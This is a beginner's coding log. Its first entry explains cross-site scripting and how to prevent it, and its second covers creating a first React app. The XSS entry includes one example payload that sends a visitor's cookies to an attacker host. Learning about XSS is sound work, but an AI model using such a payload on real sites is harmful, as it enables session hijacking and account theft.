# 100 Days of Coding - Log

## Start of Log

## Day 1 - July 24, 2019
**Subject:** Cross-Site Scripting
**Today's Progress:** I was able to understand the concept of Cross-Site Scripting (XSS), it's use and prevention.

**Thoughts:**
 XSS flaws occur whenever an applications includes untrusted data in a new web page without proper validation or escaping or updates a n existing web page w/ user supplied data using a browser api that can create Javascript.

It enables attackers to inject client-side scripts into web pages viewed by other users.

### What does XSS can do?
 - Malicious javascript can be used to do all sorts of malicious attacks because basically, it can access the api or anything that connects to the database. it also can affect the behavior of the page.
- it can be used to steal user cookies that allows the attacker to use the website pretendingto be that user that he stole.

### Example of injections to the `<input>` tags or in the URL:
	`><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>`.

or other HTML Tags like what i've tested `<i>` which transformed the remainder of the elements in the HTML Body into _Italic_.

### Preventions:
 - The preferred option is to properly escape untrusted data based on HTML context that the data will be placed into.
 - avoid passing untrusted data to Javascript and other browser APIs that can generate active content.
 
## 

## Day 2 - July 25, 2019

**Subject:** Javascript (ReactJS)

**Today's Progess:** I started creating my first react app with `npx create-react-app react-app` and created my own _index.js_ file.

**Thoughts:**

I Encountered a problem in running the `npm install -g create-react-app` and `npx create-react-app react-app` commands on my terminal so i had to surf on the web on how can i fix it. but luckily it was fixed by running the `sudo chown -r <path>` command.

  

I run my app with `npm start` on the terminal and prints _Hello World_

  

I put these lines of codes in my _index.js_ as a test for starting the app.

  

```
import React from 'react';
import ReactDOM from 'react-dom';

const App = () => {
return <div>Hello World</div>
};

ReactDOM.render(
<App />,
document.querySelector('#root')
);
```
<br>

|  import | React | from | 'react' |
|---------|-------|------|---------|
|gives me access to<br>codes from other files<br>or dependencies <br> that I will import.|The variable I want <br> to assign this import<br> to.| I'm about to specify<br>the name of the<br>library or file that I'm<br>importing from.|The name of the<br>dependency or <br> path to the file I<br>am importing.

<br>
`ReactDOM.render` takes the component and shows it on the screen.